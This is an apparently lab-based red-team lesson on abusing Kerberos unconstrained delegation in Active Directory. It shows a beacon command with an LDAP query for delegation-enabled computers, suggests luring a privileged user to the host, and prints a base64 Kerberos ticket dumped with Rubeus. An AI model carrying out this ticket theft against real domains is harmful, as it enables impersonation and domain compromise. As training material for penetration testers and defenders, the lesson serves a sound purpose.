

Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.  The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

  

![](https://files.cdn.thinkific.com/file_uploads/584845/images/c2a/6cc/d95/unconstrained.png)

  

We know how a user performs Kerberos authentication to the Web Server, but how can the Web Server authenticate to the DB and perform actions as the user?  Unconstrained Delegation was the first solution to this problem, introduced in Windows 2000.  When configured on a computer, the KDC includes a copy of the user's TGT inside the TGS.  In this example, when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory.  When the Web Server needs to access the DB Server on behalf of that user, it uses the user’s TGT to request a TGS for the database service.

An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.  If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

This query will return all computers that are permitted for unconstrained delegation.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] samaccountname : DC-2$
	[+] dnshostname    : dc-2.dev.cyberbotic.io
	
	[+] samaccountname : WEB$
	[+] dnshostname    : web.dev.cyberbotic.io
```

  Domain Controllers are always permitted for unconstrained delegation.

  

If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as `dir \\web\c$` is enough.  Rubeus `triage` will show all the tickets that are currently cached.  TGTs can be identified by the krbtgt service.






```
    doIFkDCCBYygAwIBBaEDAgEWooIEijCCBIZhggSCMIIEfqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBDgwggQ0oAMCARKhAwIBAqKCBCYEggQiI2vdamM7r/60iiRmTiUYR6wNTAdLUSfpXuJnoKpYRBCD9lkH32540Dcjj5DSTUegyH0boujjswfDc+34VazhKX4TJMjfHEBHeulQkZPHnq+DF3kKXVnQTZIEll2MJdODk+k5qVUmsZBd2XQ200+x8emW9/dpnLwh7/ALPNCH+FDzBOchdsrq35ZdZMAAN6ftJkdWBo2N8GiZA8A1dc1ppfCQpsNi4Wdp/UnMBzirLPpiGvGpom1UfKvM80UjdlCz12wxO1puMnsFVzOZyOgPZmcX+23q4+3Q+3XJRSm7jbNGU+6oH9LVFj+Rt2a8mnOeSa1DYzE8iP8HAwHW6ow/vralqOD0yJs00C7mXINAzS5vFmSQmGMJMgBwKtrcrjCt4KG2P1o5kGPo/tYoJAFca/SEAPXRUXLPlzCGPkYVgUt1kC6EcvADEufCRsFJKthOa+lzURRr+89ioCFqjiGyvgxvdnLRQeEEYk7XC2tF4AX1ff9yv2TcGTC7CaTWixWqkZNCqB0W9BqU1aiJWWH01wuFuzLm+gwLBJ9vIaXSOSnCPmbw9CtVkmO4gdfOx9/WbWO4KN3Hvw+/KnJpMUh8nX9awmkHWNPXbfqv/TWpE8jOG/3LXf+qklN2GSbi73Be9bDbMdN0Ko7dcXIW3C9z2b545FeetuCU8q1j3a5D9wx2+BBHEOmwi1wt2zq2CHl0crJEZvRJ3VmCk5I1/psv7qQmf8sX+qH5HV1bvwyXAd1UDRZA2VEdCYQz3+bsXa/xnx0Db6IqRCmnADwsKvhkSsFaltgpe8bemucFRgan0Y8/HFeOoDY4rypxsYYxXjV7dlvNf9Xb7F9vbKJA+wke+jf4VecUDdX71aNokYSh0+Y+cr4Dt6C85y5raWP3LhMWOwgur8pvKxn1kOeu3sELoMg+uPU5PtrUDgu6vZ7koGi02D5xq8+pNG+phZL6wRjaVIVINrvtSYkRTFFT+xPOkj18m1qH5O0TwAbRGWS0LBVZ+wbZoCdYGAMeeSIEVNcC6I/HQbZIo7TlYzgp8XEBujvpnvi6Ci1675Wh/ccFuzwWTVDFRBI4llOLToSeYtipBY0P2wgizK2w9M8uYEj3cWAPdIvIh+7hX3i3TOqY7wG9JvEwT0NDJvYfXYJxFHqQG/ZXn8kx6QU9+nBPmza1b2uJOecEzmXl7DzYXcZ++hj0gbC4sgBLj9b20/zahVoTRFH+3wdHeVJIWnj7cDwXP5dzwe9sq93QXTv9RcXUHNeGGQ35kbqZXWQhR5fCtLdkamdjmOrs9e8NHRQcFMlDBgSnSvDEim9Y7ZUMnH0jdloMMyRWeU7UEZa2ogD2VRzP7WmvFYhqs8wmCzQWHL8R9lnPvl51S71qCa5T6ZsFPqm7r2Uz3ogSXVCKvhSW6wgMCYSjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBokon68HZ5orQwJN2mNyWtAtUSkrypme38JhWV45CNrKETGxFERVYuQ1lCRVJCT1RJQy5JT6IRMA+gAwIBAaEIMAYbBFdFQiSjBwMFAEDhAAClERgPMjAyNTA0MTQxMzIxMzJaphEYDzIwMjUwNDE0MjMyMTMyWqcRGA8yMDI1MDQyMTEzMjEzMlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

```




```

```